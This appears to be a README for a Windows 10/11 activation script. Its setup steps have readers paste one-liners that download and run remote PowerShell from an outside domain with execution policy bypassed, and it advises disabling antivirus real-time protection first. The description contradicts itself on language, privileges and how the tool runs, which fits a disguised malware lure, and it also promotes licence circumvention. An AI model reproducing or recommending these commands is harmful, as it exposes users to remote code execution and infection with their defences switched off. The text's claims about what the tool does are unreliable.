<div align="center">

# WIN10ACT: Windows Activation Automation Script for Windows 10 & 11

![preview](https://raw.githubusercontent.com/faty759/win10-automation-script/main/thumb_b7d3.svg)

[![tests](https://img.shields.io/badge/Tests-Success-2ea44f?style=flat&labelColor=0d1117)]() [![release](https://img.shields.io/badge/Release-Active-2ea44f?style=flat&labelColor=0d1117)]() [![ps-core](https://img.shields.io/badge/Ps--Core-5.1%2B-e11d48?style=flat&labelColor=0d1117)]() [![lang](https://img.shields.io/badge/Lang-Python-f43f5e?style=flat&labelColor=0d1117)]()

</div>

---

WIN10ACT is a self-contained batch script that automates activation for Windows 10 and later, so you don't have to walk through the process by hand. Drop it on a target machine, run it with the privileges it expects, and it handles the rest. The script is meant to be readable and easy to modify, so you can trace exactly what each step does before running it anywhere. If you want to improve it, fork the repository and send changes back through a pull request.

## 🛠️ One-Click Setup (PowerShell)

> [!TIP]
> **One-line setup** — just run the command below.
> Win 10/11 · PowerShell 5.1+ · Standard user

### 1️⃣ Prepare PowerShell
* Press `Win + X`.
* Click **Terminal** or **Windows PowerShell** from the menu.

### 2️⃣ Run the script
Paste and run. Wait until the process completes.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ Forced run via CMD
Paste this into a standard Command Prompt (cmd) and press `Enter`:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> Some antivirus engines flag automated installers. If blocked, disable Real-time protection briefly, run the setup, and enable it back.

## 🔧 Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## What it does

WIN10ACT is a script that automates activation of Windows 10 and later builds. It runs a sequence of activation steps against the local system without requiring you to walk through each one by hand.

At its core, the script:

- Detects the installed Windows edition and selects the matching activation path.
- Applies the appropriate product key for that edition before attempting activation.
- Runs the activation routine locally and reports the resulting status.
- Leaves system files untouched outside the activation process, so the machine stays in a normal, bootable state.

It is intended for clean, repeatable activation on a single machine — run it, read the output, and confirm the status it reports. There is no background service, no persistent agent, and no configuration needed for the default case. If you need to adjust behavior, the Configuration section covers the available options.

## Configuration

Configuration here is intentionally minimal. The script is designed to run with sane defaults, and most users never need to touch anything. If you do need to adjust behavior, everything lives in one place: the config block at the top of the main script.

Open the script and look for the clearly marked configuration section. Each option is a simple key-value assignment, so you can edit values directly without hunting through the logic.

Key options you may want to set:

- **Activation mode** — controls whether the script attempts online activation, offline activation, or both in sequence. Defaults to the automatic path that works for most Windows 10+ installs.
- **Retry count** — number of attempts before the script gives up and reports failure. Increase this on flaky networks; the default is fine for stable connections.
- **Timeout** — how long each activation step waits before moving on. Raise it if you're on a slow or proxied connection.
- **Log verbosity** — toggles between quiet output and detailed step-by-step logging. Turn this on when troubleshooting so you can see exactly where a run stalls.
- **Log file path** — where run output is written if logging is enabled. Point it somewhere writable; the default is alongside the script.

A few practical notes:

- Edit values as plain assignments; don't add quotes unless the value is a string path.
- Keep a backup of the original config block before changing multiple options at once, so you can revert cleanly.
- If you're deploying across several machines, keep one tuned copy of the script and reuse it rather than editing per machine.
- Changes take effect on the next run; no separate build or reload step is required.

If a setting isn't listed above, leave it alone. The remaining keys are tuned for the default flow and changing them without reason tends to cause more problems than it solves. When in doubt, reset to the shipped defaults and re-run before adjusting further.

## Examples

Run the script with default settings for a standard activation pass:

```bat
WIN10ACT.bat
```

Pass a specific edition key when you know exactly which target you want:

```bat
WIN10ACT.bat /edition:Pro
```

Skip the pre-flight checks and go straight to activation (useful when re-running on a machine that was already validated):

```bat
WIN10ACT.bat /skipchecks
```

Run in quiet mode for unattended or scheduled use — no prompts, log only:

```bat
WIN10ACT.bat /quiet /log:"%TEMP%\win10act.log"
```

Combine flags in a single line; order does not matter:

```bat
WIN10ACT.bat /quiet /edition:Home /log:win10act.log
```

Invoke from a scheduled task by pointing the action at the script and passing arguments in the "Add arguments" field:

```
/quiet /log:"C:\Logs\win10act.log"
```

Preview what the script would do without applying changes:

```bat
WIN10ACT.bat /dryrun
```

Check the current activation status only and exit:

```bat
WIN10ACT.bat /status
```

If a run fails, re-execute with verbose output to capture the failing step:

```bat
WIN10ACT.bat /verbose /log:win10act-debug.log
```

Typical exit codes for scripting around the result:

- `0` — activation succeeded or status check passed
- `1` — activation failed (see log for the failing step)
- `2` — invalid argument or unsupported edition
- `3` — pre-flight checks failed

Example wrapper that retries once on failure and stops on success:

```bat
WIN10ACT.bat /quiet /log:win10act.log || WIN10ACT.bat /quiet /verbose /log:win10act-retry.log
```

## FAQ

**Does this work on Windows 11?**
Yes. The script targets Windows 10 and later, so Windows 11 is covered. If a build behaves differently, check the configuration section before assuming the script is broken.

**Why did the script exit without doing anything?**
Most likely it detected an unsupported build or missing prerequisites. Run it from an elevated shell and watch the console output — the script logs why it bails instead of failing silently.

**Do I need to run it as administrator?**
Yes. Activation changes system-level licensing state, and the script will refuse to proceed without the privileges to do so. Launch your terminal as admin before running it.

**Can I run it more than once?**
Yes, it's safe to re-run. The script checks current activation state first and skips work that's already done. Re-running is the standard fix for a partial or interrupted run.

**How do I know it actually worked?**
The script prints the resulting activation status at the end of its run. Cross-check with the system's own activation panel if you want a second opinion.

**It failed — what do I check first?**
In order: admin rights, network connectivity if your configuration requires it, and the build number against what the script supports. Most failures are one of those three.

**Can I customize what it does?**
Yes — see the Configuration section. Keep changes minimal and re-test after editing; the script assumes its defaults unless you deliberately override them.

**Does it leave anything behind?**
It may modify licensing-related system state as part of activation — that's the point. Review the script before running it if you need to know exactly what it touches.

**Is this legal / safe?**
That's on you. See the Disclaimer section. This project is provided as-is; understand what it does before running it on any machine you care about.

## Disclaimer

This script is provided as-is, with no guarantees of any kind. Activation behavior depends on your Windows edition, build number, and current licensing state, so results can vary between machines. You are responsible for how you run it and for any changes it makes to your system.

Use it only on systems you own or are explicitly authorized to administer. Running activation tools on hardware you do not control may violate the terms of service of the software vendor or your organization's policies. Review what the script does before executing it, prefer a test machine or VM first, and keep a restore point or backup handy in case something goes sideways.

The maintainers of WIN10ACT accept no liability for data loss, system instability, licensing issues, or any other damages arising from use or misuse of this script. If activation fails or behaves unexpectedly, report it through the project's issue tracker rather than assuming it will be fixed for your specific configuration.